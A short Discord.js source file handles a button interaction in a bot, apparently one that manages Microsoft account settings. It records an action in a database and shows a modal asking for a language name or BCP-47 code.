const { TextInputStyle } = require("discord.js");
const generate = require("../../utils/generate");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");

module.exports = {
    name: "changelanguagesec",
    callback: async (client, interaction) => {
        const parts = interaction.customId.split('|');
        const isSecure = parts[1] === "true";
        const hasAction = parts.length > 2;

        let customModalId;

        if (hasAction) {
            const actionId = generate(32);
            try {
                await client.queryParams(
                    `INSERT INTO actions (id, action) VALUES (?, ?)`,
                    [actionId, `changelanguagemodal|${parts[1]}|${parts[2]}`]
                );
            } catch (err) {
                // error handling omitted
            }
            customModalId = `action|${actionId}`;
        } else {
            customModalId = isSecure ? `changelanguagemodal|true` : `changelanguage`;
        }

        interaction.showModal(modalBuilder(
            customModalId,
            `Change Microsoft Language`,
            [
                {
                    setCustomId: 'language',
                    setRequired: false,
                    setLabel: "Language name or BCP-47 code",
                    setPlaceholder: "e.g. en-US, Spanish, ..",
                    setStyle: TextInputStyle.Short
                }
            ]
        ));
    }
};
